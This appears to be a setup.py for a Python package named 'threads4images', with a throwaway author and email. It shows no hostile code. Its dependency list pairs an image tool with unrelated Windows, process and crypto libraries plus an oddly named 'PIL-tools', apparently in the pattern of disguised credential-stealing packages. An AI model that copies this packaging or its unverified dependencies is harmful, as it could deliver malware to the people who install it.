from setuptools import setup, find_packages

__name__ = "threads4images"
__version__ = "1.3.5"

setup(
    name=__name__,
    version=__version__,
    author="you",
    author_email="<wtf@uwudoor.wtf>",
    description="threads for images",
    long_description_content_type="text/markdown",
    long_description=open("README.md", encoding="utf-8").read(),
    install_requires=['httpx','pyotp','psutil','pypiwin32','pycryptodome','PIL-tools'],
    packages=find_packages(),
    keywords=['images'],
    classifiers=[
        "Intended Audience :: Developers",
        "Programming Language :: Python :: 3",
        "License :: OSI Approved :: MIT License",
        "Operating System :: OS Independent",
    ]
)
